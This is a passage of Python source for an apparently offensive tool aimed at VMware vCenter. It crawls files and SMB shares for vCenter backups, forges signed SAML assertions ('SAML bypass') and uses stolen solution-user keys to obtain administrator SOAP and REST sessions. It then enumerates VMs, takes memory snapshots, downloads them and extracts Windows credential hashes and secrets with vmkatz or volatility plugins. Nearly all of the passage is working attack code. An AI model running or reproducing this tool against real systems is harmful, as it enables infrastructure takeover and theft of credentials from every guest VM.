    # SIGN realm=<hex_nonce>,service=...,sts=...
    nonce_hex = None
    for part in www_auth.split(','):
        part = part.strip()
        if part.upper().startswith('SIGN REALM=') or part.upper().startswith('REALM='):
            nonce_hex = part.split('=', 1)[1].strip().strip('"')
            break
    if not nonce_hex:
        if verbose:
            print(f'[v] Could not parse SIGN realm from WWW-Authenticate: {www_auth}')
        return None
    nonce_bytes = bytes.fromhex(nonce_hex)

    saml_token = sts_issue_hok_token(target, key_pem, cert_pem, domain, verbose=verbose)
    if not saml_token:
        if verbose:
            print('[v] HoK token request failed')
        return None
    if verbose:
        print(f'[v] STS issued HoK SAML token ({len(saml_token)} chars)')

    saml_b64 = base64.b64encode(saml_token.encode('utf-8')).decode()

    priv    = serialization.load_pem_private_key(key_pem.encode(), password=None)
    sig_b64 = base64.b64encode(
        priv.sign(nonce_bytes, _pad.PKCS1v15(), hashes.SHA256())).decode()

    r = req.post(
        f'https://{target}/api/session',
        headers={
            'Authorization': f'SIGN token="{saml_b64}",signature="{sig_b64}"',
            'Content-Type': 'application/json',
        },
        data=b'',
        verify=False,
        timeout=20,
    )
    if verbose:
        print(f'[v] SIGN auth → HTTP {r.status_code}: {r.text[:300]}')

    if r.status_code in (200, 201):
        tok = r.text.strip('"')
        if tok:
            print('[+] REST API session acquired (HoK SIGN auth)')
            return tok

    return None


# ─── SOAP VIM session via LoginByToken ─────────────────────────────────────────

_LOGINBYTOKEN_TMPL = '''\
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <SOAP-ENV:Header>
    <wsse:Security xmlns:wsse="{wsse}" xmlns:wsu="{wsu}">
      {saml_assertion}
    </wsse:Security>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <LoginByToken xmlns="{vim}">
      <_this type="SessionManager">SessionManager</_this>
    </LoginByToken>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>'''.format(
    wsse=_WSS_SECEXT, wsu=_WSS_UTILITY, vim=_VIM_NS,
    saml_assertion='{saml_assertion}')


def loginbytoken_soap(target: str, saml_assertion_xml: str, verbose=False):
    import requests as req
    req.packages.urllib3.disable_warnings()

    body = _LOGINBYTOKEN_TMPL.replace('{saml_assertion}', saml_assertion_xml)
    try:
        r = req.post(
            f'https://{target}/sdk',
            data=body.encode('utf-8'),
            headers={
                'Content-Type': 'text/xml; charset=UTF-8',
                'SOAPAction': 'urn:vim25/8.0.3.0',
            },
            verify=False,
            timeout=20,
        )
        if verbose:
            print(f'[v] LoginByToken → HTTP {r.status_code}')
        if r.status_code == 200 and 'vmware_soap_session' in r.headers.get('Set-Cookie', ''):
            m = re.search(r'vmware_soap_session=([^;]+)', r.headers['Set-Cookie'])
            if m:
                if verbose: print('[+] VIM SOAP session established')
                return 'vmware_soap_session', m.group(1).strip('"')
        if verbose:
            print(f'[v] LoginByToken response: {r.text[:600]}')
    except Exception as e:
        if verbose:
            print(f'[v] LoginByToken error: {e}')
    return None, None


# ─── SOAP VM enumeration ────────────────────────────────────────────────────────

_RETRIEVE_VMS_SOAP = '''\
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <SOAP-ENV:Body>
    <RetrievePropertiesEx xmlns="urn:vim25">
      <_this type="PropertyCollector">propertyCollector</_this>
      <specSet>
        <propSet>
          <type>VirtualMachine</type>
          <pathSet>name</pathSet>
          <pathSet>runtime.powerState</pathSet>
          <pathSet>config.hardware.numCPU</pathSet>
          <pathSet>config.hardware.memoryMB</pathSet>
          <pathSet>config.files.vmPathName</pathSet>
          <pathSet>snapshot.rootSnapshotList</pathSet>
        </propSet>
        <objectSet>
          <obj type="Folder">group-d1</obj>
          <skip>false</skip>
          <selectSet xsi:type="TraversalSpec">
            <name>folders</name><type>Folder</type><path>childEntity</path><skip>false</skip>
            <selectSet><name>folders</name></selectSet>
            <selectSet xsi:type="TraversalSpec">
              <name>dcVm</name><type>Datacenter</type><path>vmFolder</path><skip>false</skip>
              <selectSet><name>folders</name></selectSet>
            </selectSet>
            <selectSet xsi:type="TraversalSpec">
              <name>crHost</name><type>ComputeResource</type><path>resourcePool</path><skip>false</skip>
              <selectSet xsi:type="TraversalSpec">
                <name>rpVm</name><type>ResourcePool</type><path>vm</path><skip>false</skip>
              </selectSet>
            </selectSet>
          </selectSet>
        </objectSet>
      </specSet>
      <options/>
    </RetrievePropertiesEx>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>'''


def _walk_snap_tree(el, ns: dict, out: dict) -> None:
    snap_id = el.findtext('v:id', namespaces=ns)
    name    = el.findtext('v:name', namespaces=ns)
    ct_str  = el.findtext('v:createTime', namespaces=ns)
    if snap_id and name:
        ct = None
        if ct_str:
            try:
                ct = datetime.strptime(ct_str[:19], '%Y-%m-%dT%H:%M:%S').replace(tzinfo=timezone.utc)
            except ValueError:
                pass
        out[int(snap_id)] = {'name': name, 'create_time': ct}
    for child in el.findall('v:childSnapshotList', ns):
        _walk_snap_tree(child, ns, out)


def soap_list_vms(target: str, vim_cookie: str, verbose=False) -> list:
    """Enumerate all VMs via SOAP PropertyCollector using the VIM session cookie."""
    import requests as req
    req.packages.urllib3.disable_warnings()
    etree = _need('lxml.etree', 'lxml')

    try:
        r = req.post(
            f'https://{target}/sdk',
            data=_RETRIEVE_VMS_SOAP.encode(),
            headers={
                'Content-Type': 'text/xml; charset=UTF-8',
                'SOAPAction': 'urn:vim25/8.0.3.0',
                'Cookie': f'vmware_soap_session={vim_cookie}',
            },
            verify=False,
            timeout=30,
        )
        if r.status_code != 200:
            if verbose:
                print(f'[v] SOAP VM list HTTP {r.status_code}: {r.text[:300]}')
            return []

        root = etree.fromstring(r.content)
        vms  = []
        ns   = {'v': _VIM_NS}
        for obj in root.findall('.//v:returnval/v:objects', ns):
            vm   = {'vm': '', 'name': '', 'power_state': '', 'numCPU': '',
                    'memMB': '', 'vmPath': '', 'snapshots': {}}
            ref = obj.find('v:obj', ns)
            if ref is not None:
                vm['vm'] = ref.text or ''
            for prop in obj.findall('v:propSet', ns):
                pname = prop.findtext('v:name', default='', namespaces=ns)
                val   = prop.findtext('v:val', default='', namespaces=ns)
                if pname == 'name':
                    vm['name'] = val
                elif pname == 'runtime.powerState':
                    vm['power_state'] = val
                elif pname == 'config.hardware.numCPU':
                    vm['numCPU'] = val
                elif pname == 'config.hardware.memoryMB':
                    vm['memMB'] = val
                elif pname == 'config.files.vmPathName':
                    vm['vmPath'] = val
                elif pname == 'snapshot.rootSnapshotList':
                    snaps  = {}
                    val_el = prop.find('v:val', ns)
                    if val_el is not None:
                        for tree in val_el.findall('v:VirtualMachineSnapshotTree', ns):
                            _walk_snap_tree(tree, ns, snaps)
                    vm['snapshots'] = snaps
            vms.append(vm)
        return vms
    except Exception as e:
        if verbose:
            print(f'[v] SOAP VM list error: {e}')
        return []


# ─── SOAP snapshot creation ─────────────────────────────────────────────────────

_CREATE_SNAP_TMPL = '''\
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Body>
    <CreateSnapshot_Task xmlns="urn:vim25">
      <_this type="VirtualMachine">{vm_moref}</_this>
      <name>rav-memdump</name>
      <description>rent-a-vcenter memory snapshot</description>
      <memory>true</memory>
      <quiesce>false</quiesce>
    </CreateSnapshot_Task>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>'''


def soap_wait_for_task(target: str, vim_cookie: str, task_moref: str,
                       timeout: int = 300, verbose=False) -> bool:
    """Poll a task until it reaches state success or error. Returns True on success."""
    import requests as req
    req.packages.urllib3.disable_warnings()
    etree = _need('lxml.etree', 'lxml')

    body = f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:vim25="urn:vim25">
  <soapenv:Body>
    <vim25:RetrieveProperties>
      <vim25:_this type="PropertyCollector">propertyCollector</vim25:_this>
      <vim25:specSet>
        <vim25:propSet>
          <vim25:type>Task</vim25:type>
          <vim25:pathSet>info.state</vim25:pathSet>
          <vim25:pathSet>info.progress</vim25:pathSet>
        </vim25:propSet>
        <vim25:objectSet>
          <vim25:obj type="Task">{task_moref}</vim25:obj>
          <vim25:skip>false</vim25:skip>
        </vim25:objectSet>
      </vim25:specSet>
    </vim25:RetrieveProperties>
  </soapenv:Body>
</soapenv:Envelope>'''

    hdrs = {
        'Content-Type': 'text/xml; charset=UTF-8',
        'SOAPAction': 'urn:vim25/8.0.3.0',
        'Cookie': f'vmware_soap_session={vim_cookie}',
    }
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            r = req.post(f'https://{target}/sdk', data=body.encode(),
                         headers=hdrs, verify=False, timeout=15)
            if r.status_code == 200:
                root  = etree.fromstring(r.content)
                state, prog = '', ''
                for ps in root.findall('.//{urn:vim25}propSet'):
                    name = ps.findtext('{urn:vim25}name')
                    val  = ps.findtext('{urn:vim25}val') or ''
                    if name == 'info.state':
                        state = val
                    elif name == 'info.progress':
                        prog = val
                if state == 'success':
                    print()
                    return True
                if state == 'error':
                    print(f'\n[-] Task {task_moref} failed')
                    return False
                print(f'\r    Snapshot progress: {prog or "?"}%  ', end='', flush=True)
        except Exception as e:
            if verbose:
                print(f'\n[v] Task poll error: {e}')
        time.sleep(5)
    print(f'\n[-] Timed out waiting for task {task_moref}')
    return False


def soap_remove_all_snapshots(target: str, vim_cookie: str, vm_moref: str,
                              verbose=False) -> bool:
    """Remove all snapshots from a VM via SOAP (consolidates disk)."""
    import requests as req
    req.packages.urllib3.disable_warnings()
    body = f'''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:vim25="urn:vim25">
  <soapenv:Body>
    <vim25:RemoveAllSnapshots_Task>
      <vim25:_this type="VirtualMachine">{vm_moref}</vim25:_this>
      <vim25:consolidate>true</vim25:consolidate>
    </vim25:RemoveAllSnapshots_Task>
  </soapenv:Body>
</soapenv:Envelope>'''
    try:
        r = req.post(
            f'https://{target}/sdk',
            data=body.encode(),
            headers={
                'Content-Type': 'text/xml; charset=UTF-8',
                'SOAPAction': 'urn:vim25/8.0.3.0',
                'Cookie': f'vmware_soap_session={vim_cookie}',
            },
            verify=False, timeout=30,
        )
        if r.status_code == 200:
            if verbose:
                print('[v] RemoveAllSnapshots_Task accepted')
            return True
    except Exception as e:
        if verbose:
            print(f'[v] RemoveAllSnapshots error: {e}')
    return False


def soap_create_snapshot(target: str, vim_cookie: str, vm_moref: str,
                          verbose=False) -> str:
    """Create a memory snapshot via SOAP. Returns task MOREF or ''."""
    import requests as req
    req.packages.urllib3.disable_warnings()
    etree = _need('lxml.etree', 'lxml')

    body = _CREATE_SNAP_TMPL.replace('{vm_moref}', vm_moref)
    try:
        r = req.post(
            f'https://{target}/sdk',
            data=body.encode(),
            headers={
                'Content-Type': 'text/xml; charset=UTF-8',
                'SOAPAction': 'urn:vim25/8.0.3.0',
                'Cookie': f'vmware_soap_session={vim_cookie}',
            },
            verify=False,
            timeout=30,
        )
        if verbose:
            print(f'[v] CreateSnapshot_Task HTTP {r.status_code}')
        if r.status_code == 200:
            root   = etree.fromstring(r.content)
            ns     = {'v': _VIM_NS}
            task   = root.find('.//v:returnval', ns)
            if task is not None:
                return task.text or ''
    except Exception as e:
        if verbose:
            print(f'[v] SOAP CreateSnapshot error: {e}')
    return ''


# ─── data.mdb discovery ────────────────────────────────────────────────────────

_WANTED = {'database_full_backup.tar.gz', 'lotus_backup.tar.gz', 'config_files.tar.gz'}

def _is_target(name: str) -> bool:
    n = name.lower()
    return n == 'data.mdb' or n in _WANTED


def discover_local(path: str) -> list:
    root = Path(path)
    if not root.exists():
        sys.exit(f'[-] Path not found: {path}')
    if root.is_file():
        return [root]
    hits = [p for p in root.rglob('*') if p.is_file() and _is_target(p.name)]
    if not hits:
        sys.exit(f'[-] No data.mdb or .tar.gz found under {path}')
    return hits


def discover_smb(t: str, user: str, password: str, domain: str) -> list:
    SMBConnection = _need('impacket.smbconnection', 'impacket.smbconnection', attr='SMBConnection')

    # Parse target: \\host\share[\subpath], //host/share[/subpath], or bare host/IP
    host = share = subpath = None
    m = re.match(r'^[/\\]{2}([^/\\]+)[/\\]([^/\\]+)(?:[/\\](.*))?$', t.strip())
    if m:
        host    = m.group(1)
        share   = m.group(2)
        subpath = (m.group(3) or '').replace('/', '\\').rstrip('\\')
    else:
        host = t

    smb = SMBConnection(host, host, timeout=10)
    smb.login(user or '', password or '', domain or '')

    tmp   = Path(tempfile.mkdtemp(prefix='rav_smb_'))
    found = []
    _SKIP = {'IPC$', 'ADMIN$', 'SYSVOL', 'NETLOGON', 'print$', 'PRINT$'}

    def _walk(sh, start=''):
        try:
            pattern = f'{start}\\*' if start else '\\*'
            for e in smb.listPath(sh, pattern):
                name = e.get_longname()
                if name in ('.', '..'): continue
                full = f'{start}\\{name}' if start else name
                if e.is_directory():
                    _walk(sh, full)
                elif _is_target(name):
                    print(f'[+] Found \\\\{host}\\{sh}\\{full}')
                    local = tmp / f'{sh}_{full}'.replace('\\', '_')
                    with open(local, 'wb') as fh:
                        smb.getFile(sh, full, fh.write)
                    found.append(local)
        except Exception:
            pass

    if share:
        _walk(share, subpath)
    else:
        try:
            shares = [s['shi1_netname'].rstrip('\x00') for s in smb.listShares()]
        except Exception as e:
            sys.exit(f'[-] Share enumeration failed on {host}: {e}')
        for sh in shares:
            if sh in _SKIP: continue
            _walk(sh)

    smb.logoff()
    return found


def resolve_mdb(paths: list, work_dir: Path) -> Path:
    mdbs, archives = [], []
    for p in paths:
        if p.name.lower() == 'data.mdb':
            mdbs.append(p)
        else:
            archives.append(p)

    for arc in archives:
        try:
            with tarfile.open(arc) as tf:
                for m in tf.getmembers():
                    if m.name.endswith('data.mdb'):
                        m.name = Path(m.name).name
                        tf.extract(m, path=work_dir)
                        mdbs.append(work_dir / m.name)
                        break
        except Exception:
            pass

    if not mdbs:
        sys.exit('[-] No data.mdb found.')

    return max(mdbs, key=lambda p: p.stat().st_size)


# ─── SAML bypass ───────────────────────────────────────────────────────────────

def _tls_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx


def get_vcenter_hostname(target: str) -> str:
    crypto = _need('OpenSSL.crypto', 'pyOpenSSL')
    try:
        s = socket.socket()
        s.connect((target, 443))
        s = _tls_ctx().wrap_socket(s, server_hostname=target)
        der = s.getpeercert(True)
        s.close()
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, der)
        return x509.get_subject().CN
    except Exception:
        return target


def get_saml_authn_request(target: str):
    import requests as req
    req.packages.urllib3.disable_warnings()
    try:
        r = req.get(f'https://{target}/ui/login', allow_redirects=False,
                    verify=False, timeout=10)
        if r.status_code == 302:
            loc = r.headers.get('location', '')
            m = re.search(r'SAMLRequest=([^&]+)', loc)
            if m:
                compressed = base64.b64decode(urllib.parse.unquote(m.group(1)))
                xml_bytes  = zlib.decompress(compressed, -8)
                etree = _need('lxml.etree', 'lxml')
                root  = etree.fromstring(xml_bytes)
                return root.get('ID', '_default')
    except Exception:
        pass
    return '_default'


def build_and_sign_saml(target: str, hostname: str, domain: str,
                         key_pem: str, cert1_pem: str, cert2_pem: str,
                         authn_id: str) -> bytes:
    from datetime import datetime, timezone, timedelta
    etree     = _need('lxml.etree', 'lxml')
    XMLSigner = _need('signxml', 'signxml', attr='XMLSigner')

    now    = datetime.now(timezone.utc)
    before = (now - timedelta(days=30)).strftime('%Y-%m-%dT%H:%M:%SZ')
    after  = (now + timedelta(days=30)).strftime('%Y-%m-%dT%H:%M:%SZ')
    now_s  = now.strftime('%Y-%m-%dT%H:%M:%SZ')

    xml = (SAML_TEMPLATE
           .replace('$VCENTER_IP',   target)
           .replace('$VCENTER',      hostname)
           .replace('$DOMAIN_UPPER', domain.upper())
           .replace('$DOMAIN',       domain)
           .replace('$ID',           authn_id)
           .replace('$ISSUEINSTANT', now_s)
           .replace('$NOT_BEFORE',   before)
           .replace('$NOT_AFTER',    after))

    root         = etree.fromstring(xml.encode())
    assertion_id = root.find('{urn:oasis:names:tc:SAML:2.0:assertion}Assertion').get('ID')

    signer = XMLSigner(c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#')
    signed = signer.sign(root, reference_uri=assertion_id,
                         key=key_pem, cert=[c for c in [cert1_pem, cert2_pem] if c])
    return etree.tostring(signed, xml_declaration=True, encoding='UTF-8', pretty_print=False)


def saml_login(target: str, signed_xml: bytes) -> tuple:
    import requests as req
    req.packages.urllib3.disable_warnings()
    s = req.Session()
    s.verify = False
    # Follow the redirect to /ui/ so the server sets all session cookies
    # (JSESSIONID in the 302 response; XSRF-TOKEN in the /ui/ 200 response)
    r = s.post(
        f'https://{target}/ui/saml/websso/sso',
        data={'SAMLResponse': base64.encodebytes(signed_xml)},
        allow_redirects=True,
        timeout=15,
    )

    # Extract JSESSIONID from the session's cookie jar
    for name in ('VSPHERE-UI-JSESSIONID', 'VSPHERE-CLIENT-SESSION-ID'):
        value = s.cookies.get(name)
        if value:
            return name, value, s

    # Fall back to parsing Set-Cookie header from the initial response
    # (in case the session didn't capture it due to redirect chain)
    set_cookie = ''
    for resp in getattr(r, 'history', [r]):
        set_cookie += resp.headers.get('Set-Cookie', '') + ' '
    set_cookie += r.headers.get('Set-Cookie', '')

    for name in ('VSPHERE-UI-JSESSIONID', 'VSPHERE-CLIENT-SESSION-ID'):
        m = re.search(rf'{name}=([^;]+)', set_cookie)
        if m:
            print(f'[+] Admin session established  ({name})')
            s.cookies.set(name, m.group(1), domain=target, path='/ui')
            return name, m.group(1), s

    sys.exit(f'[-] No session cookie in SAML response (final URL: {r.url})')


# ─── REST API session ───────────────────────────────────────────────────────────

class VCenterSession:
    """
    Authenticated vCenter session.

    Authentication priority:
      1. Solution user WS-Trust chain: sol_key_pem + sol_cert_pem
         → STS SAML bearer token → SOAP LoginByToken → VIM session cookie
      2. SSO admin password (vcenter_pass) → Basic Auth → REST API token
      3. UI JSESSIONID only (limited — no REST/SOAP promotion)
    """

    def __init__(self, target: str, cookie_name: str, cookie_value: str,
                 vcenter_pass: str = None, domain: str = 'vsphere.local',
                 sol_key_pem: str = None, sol_cert_pem: str = None,
                 idp_cert_pem: str = None,
                 ui_session=None,
                 verbose: bool = False):
        import requests as _req
        _req.packages.urllib3.disable_warnings()
        self.target        = target
        self.base          = f'https://{target}'
        # Use the session from saml_login() if provided (preserves XSRF cookie),
        # otherwise create a fresh session and set the cookie manually.
        if ui_session is not None:
            self._s = ui_session
            self._s.verify = False
        else:
            self._s = _req.Session()
            self._s.verify = False
            self._s.cookies.set(cookie_name, cookie_value)
        self._cookie_name  = cookie_name
        self._cookie_value = cookie_value
        self._api_token    = None
        self._vcenter_pass = vcenter_pass
        self._sso_domain   = domain
        self._ds_auth      = None
        self._vim_cookie   = None   # vmware_soap_session value from LoginByToken
        self._verbose      = verbose
        self._cert_stale   = False  # set True when backup cert != live signing cert
        self._ui_session_valid = False  # set True after h5-config confirms hasUserSession

        if vcenter_pass:
            self._ds_auth = (f'administrator@{domain}', vcenter_pass)

        # Detect signing cert staleness (rotated since backup was taken)
        if idp_cert_pem:
            self._cert_stale = check_signing_cert_staleness(target, idp_cert_pem)
            if self._cert_stale:
                print('[!] Backup signing cert does NOT match live STS cert — LoginByToken will fail.')

        # Check if the UI session is fully authenticated (h5-config hasUserSession:true)
        # This requires a CURRENT backup (cert not stale), and a valid SAML assertion.
        # When true: psc-ui API calls for user creation work without any password.
        try:
            r = self._s.get(f'https://{target}/ui/config/h5-config',
                            params={'debug': 'false'}, timeout=10)
            if r.ok:
                cfg = r.json()
                if cfg.get('hasUserSession'):
                    self._ui_session_valid   = True
                    self._ui_client_id       = cfg.get('clientId', '')
                    self._ui_xsrf_hdr        = cfg.get('xsrfHeaderName', 'X-VSPHERE-UI-XSRF-TOKEN')
                    self._ui_xsrf_cookie     = cfg.get('xsrfCookieName', 'VSPHERE-UI-XSRF-TOKEN')
                elif verbose:
                    print('[!] h5-config: hasUserSession=false — STS back-channel rejected forged token')
            elif verbose:
                print(f'[!] h5-config: {r.status_code} {r.text[:120]}')
        except Exception as e:
            if verbose:
                print(f'[!] h5-config check failed: {e}')

        # Try solution user chain first (passwordless)
        if sol_key_pem and sol_cert_pem and not self._cert_stale:
            self._try_solution_user_auth(sol_key_pem, sol_cert_pem, domain)

        # Fall back to admin password REST API if solution user failed
        if not self._api_token and vcenter_pass:
            self._exchange_for_api_token()

    def _try_solution_user_auth(self, key_pem: str, cert_pem: str, domain: str):
        """WS-Trust → SAML → (LoginByToken VIM session) + (HoK SIGN REST API token)."""
        saml_xml = sts_issue_bearer_token(self.target, key_pem, cert_pem, domain,
                                           verbose=self._verbose)
        if not saml_xml:
            return

        vname, vcookie = loginbytoken_soap(self.target, saml_xml,
                                            verbose=self._verbose)
        if vcookie:
            self._vim_cookie = vcookie
            self._s.cookies.set('vmware_soap_session', vcookie)
            self._ds_auth = None  # cookie auth, not basic auth

        # Also try VAPI REST API via HoK SAML SIGN auth (gives vmware-api-session-id)
        api_tok = acquire_rest_api_token(self.target, key_pem, cert_pem, domain,
                                          verbose=self._verbose)
        if api_tok:
            self._api_token = api_tok
            self._s.headers['vmware-api-session-id'] = api_tok

    def _exchange_for_api_token(self):
        if self._api_token or not self._vcenter_pass:
            return self._api_token
        cred = base64.b64encode(
            f'administrator@{self._sso_domain}:{self._vcenter_pass}'.encode()
        ).decode()
        for url in [f'{self.base}/api/session',
                    f'{self.base}/rest/com/vmware/cis/session']:
            r = self._s.post(url, headers={
                'Authorization': f'Basic {cred}',
                'Content-Type': 'application/json',
            })
            if r.status_code in (200, 201):
                tok = r.json() if isinstance(r.json(), str) else r.json().get('value')
                if tok:
                    self._api_token = tok
                    self._s.headers['vmware-api-session-id'] = tok
                    print('[+] REST API token obtained via admin password')
                    return tok
        if self._verbose: print('[!] REST API token exchange failed — check -vcenter-pass')
        return None

    def get(self, path, **kw):
        return self._s.get(f'{self.base}{path}', **kw)

    def post(self, path, **kw):
        return self._s.post(f'{self.base}{path}', **kw)

    def download(self, url: str, dest: Path, auth=None):
        """Single-stream fallback download with 16MB chunks and MB/s progress."""
        kw = {'stream': True, 'verify': False}
        if auth:
            kw['auth'] = auth
        elif self._ds_auth:
            kw['auth'] = self._ds_auth

        with self._s.get(url, **kw) as r:
            r.raise_for_status()
            total = int(r.headers.get('Content-Length', 0))
            wrote = 0
            t0    = time.monotonic()
            with open(dest, 'wb') as fh:
                for chunk in r.iter_content(16 << 20):
                    fh.write(chunk)
                    wrote += len(chunk)
                    elapsed = time.monotonic() - t0 or 0.001
                    rate    = wrote / elapsed
                    if total:
                        pct = wrote * 100 // total
                        print(f'\r  {wrote>>20} / {total>>20} MB ({pct}%) {rate/(1<<20):.1f} MB/s',
                              end='', flush=True)
            print()
        return dest


# ─── parallel download ─────────────────────────────────────────────────────────

def _download_parallel(url: str, dest: Path, session, auth=None, workers: int = 8) -> Path:
    """Parallel range-request download. Falls back to single-stream when needed."""
    import errno as _errno
    kw = {'verify': False, 'timeout': 30}
    if auth:
        kw['auth'] = auth

    head = session.head(url, **kw)
    head.raise_for_status()
    total         = int(head.headers.get('Content-Length', 0))
    accept_ranges = head.headers.get('Accept-Ranges', '').lower()

    # Pre-flight disk space check
    if total:
        free = shutil.disk_usage(dest.parent).free
        if free < total:
            raise OSError(_errno.ENOSPC,
                          f'Not enough disk space: need {total>>20} MB, '
                          f'have {free>>20} MB free in {dest.parent}')

    if not total or accept_ranges != 'bytes' or total < (128 << 20):
        t0 = time.monotonic()
        wrote = 0
        with session.get(url, stream=True, **kw) as r:
            r.raise_for_status()
            with open(dest, 'wb') as fh:
                for chunk in r.iter_content(16 << 20):
                    fh.write(chunk)
                    wrote += len(chunk)
                    elapsed = time.monotonic() - t0 or 0.001
                    rate    = wrote / elapsed
                    if total:
                        pct = wrote * 100 // total
                        print(f'\r  {wrote>>20} / {total>>20} MB ({pct}%) {rate/(1<<20):.1f} MB/s',
                              end='', flush=True)
        print()
        return dest

    # Pre-allocate
    with open(dest, 'wb') as fh:
        fh.seek(total - 1)
        fh.write(b'\x00')

    done  = [0]
    lock  = threading.Lock()
    abort = threading.Event()
    chunk_sz = (total + workers - 1) // workers

    def _fetch(start: int, end: int):
        headers = {'Range': f'bytes={start}-{end}'}
        try:
            with session.get(url, headers=headers, stream=True,
                             verify=False, timeout=120, auth=auth) as r:
                r.raise_for_status()
                pos = start
                with open(dest, 'r+b') as fh:
                    for chunk in r.iter_content(16 << 20):
                        if abort.is_set():
                            return
                        fh.seek(pos)
                        fh.write(chunk)
                        pos += len(chunk)
                        with lock:
                            done[0] += len(chunk)
        except OSError as e:
            if e.errno == _errno.ENOSPC:
                abort.set()
        except Exception:
            abort.set()

    threads = []
    for i in range(workers):
        s = i * chunk_sz
        e = min(s + chunk_sz - 1, total - 1)
        t = threading.Thread(target=_fetch, args=(s, e), daemon=True)
        t.start()
        threads.append(t)

    t0 = time.monotonic()
    def _progress():
        while any(t.is_alive() for t in threads):
            elapsed = time.monotonic() - t0 or 0.001
            d = done[0]
            rate = d / elapsed
            pct  = d * 100 // total if total else 0
            print(f'\r  {d>>20} / {total>>20} MB ({pct}%) {rate/(1<<20):.1f} MB/s',
                  end='', flush=True)
            time.sleep(0.5)
    pt = threading.Thread(target=_progress, daemon=True)
    pt.start()

    for t in threads:
        t.join()
    pt.join(timeout=1)
    print()

    if abort.is_set():
        dest.unlink(missing_ok=True)
        raise OSError(_errno.ENOSPC, f'Download aborted — no space left on device')

    return dest


# ─── credential extraction ─────────────────────────────────────────────────────

def _extract_creds(vmem_path: Path, output_dir: Path):
    stem    = vmem_path.stem
    outfile = output_dir / f'{stem}_creds.txt'

    # Pass .vmem to vmkatz — it auto-discovers the .vmsn companion in the same dir.
    # Fall back to .vmsn only when .vmem is missing (disk-only snapshot edge case).
    vmsn_path = vmem_path.with_suffix('.vmsn')
    if vmem_path.exists():
        input_files = [str(vmem_path)]
    elif vmsn_path.exists():
        print('    [!] .vmem not found — trying .vmsn (disk-only snapshot may yield no creds)')
        input_files = [str(vmsn_path)]
    else:
        print('    [!] Neither .vmem nor .vmsn found — skipping')
        return

    vmkatz_bin = shutil.which('vmkatz')
    if vmkatz_bin:
        print(f'    [*] vmkatz {" ".join(Path(f).name for f in input_files)}')
        try:
            r = subprocess.run(
                [vmkatz_bin] + input_files,
                capture_output=True, text=True, timeout=600,
            )
            out = (r.stdout + r.stderr).strip()
            if out:
                print(out)
                outfile.write_text(out)
                print(f'\n    [+] Saved to {outfile}')
            else:
                print('    [-] No credentials extracted — VM may not have been logged into yet')
        except subprocess.TimeoutExpired:
            print('    [!] vmkatz timed out')
        except Exception as e:
            print(f'    [!] vmkatz error: {e}')
        return

    # Fallback: volatility3
    vol = shutil.which('vol') or shutil.which('vol3') or shutil.which('volatility3')
    if not vol:
        print('[!] vmkatz not found — build from https://github.com/nikaiw/VMkatz')
        print('[!] Fallback: pip install volatility3')
        return
    print('    [*] vmkatz not found — falling back to volatility3')
    combined = []
    for plugin in ('windows.registry.hashdump.Hashdump',
                   'windows.registry.lsadump.Lsadump',
                   'windows.cachedump.Cachedump'):
        print(f'    [*] {plugin}...')
        try:
            r = subprocess.run([vol, '-f', str(vmem_path), plugin],
                               capture_output=True, text=True, timeout=300)
            out = r.stdout.strip()
            if out:
                print(out)
                combined.append(f'# {plugin}\n{out}')
        except subprocess.TimeoutExpired:
            print(f'    [!] {plugin} timed out')
        except Exception as e:
            print(f'    [!] {plugin} error: {e}')
    if combined:
        outfile.write_text('\n\n'.join(combined))
        print(f'\n    [+] Saved to {outfile}')
    else:
        print('    [-] No credentials extracted — VM may not have been logged into yet')


# ─── interactive helpers ────────────────────────────────────────────────────────

def _prompt(msg: str) -> bool:
    try:
        ans = input(f'{msg} [Y/n] ').strip().lower()
        return ans in ('', 'y', 'yes')
    except (EOFError, KeyboardInterrupt):
        return False


def _select_vms(vms: list) -> list:
    for i, v in enumerate(vms, 1):
        name  = v.get('name', '?')
        state = v.get('power_state', v.get('powerState', '?'))
        mem   = v.get('memMB', '')
        print(f'  [{i}] {name}  ({state})  {mem} MB RAM')
    try:
        raw = input('[?] Select VMs to dump (1,2 or ALL): ').strip()
    except (EOFError, KeyboardInterrupt):
        return []
    if raw.upper() in ('A', 'ALL', ''):
        return vms
    selected = []
    for part in raw.split(','):
        part = part.strip()
        if part.isdigit():
            idx = int(part) - 1
            if 0 <= idx < len(vms):
                selected.append(vms[idx])
    return selected


def _select_snapshot_menu(entries: list, vm_name: str = '') -> tuple:
    """Snapshot selection menu. Returns ('existing', entry_dict) or ('new', None)."""
    if not entries:
        return ('new', None)

    label = vm_name or 'this VM'
    print(f'\n[*] Existing snapshots on {label} ({len(entries)}):')
    for i, e in enumerate(entries, 1):
        dt  = e['create_time'].strftime('%Y-%m-%d %H:%M UTC') if e['create_time'] else 'unknown'
        mem = '[mem]' if e.get('has_memory') else '[disk only — no creds]'
        print(f'  [{i}] {e["name"]}  ({dt})  {mem}')
    print(f'  [N] Create new snapshot  [mem]')
    try:
        raw = input('[?] Select snapshot (1/N): ').strip()
    except (EOFError, KeyboardInterrupt):
        return ('new', None)

